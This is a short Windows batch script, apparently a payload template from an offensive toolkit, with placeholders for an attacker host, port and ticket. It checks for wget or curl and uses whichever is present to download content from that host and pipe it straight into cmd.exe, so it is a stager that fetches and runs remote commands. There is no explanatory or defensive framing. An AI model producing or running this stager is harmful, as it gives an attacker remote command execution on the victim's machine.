@echo off & setlocal enabledelayedexpansion
wget.exe --version >nul 2>&1 && (wget -q -O - http://*LHOST*:*LPORT*/*TICKET* | cmd.exe) || (curl.exe --version >nul 2>&1 && (curl -s http://*LHOST*:*LPORT*/*TICKET* | cmd.exe) || echo Neither cURL nor Wget is available in PATH)
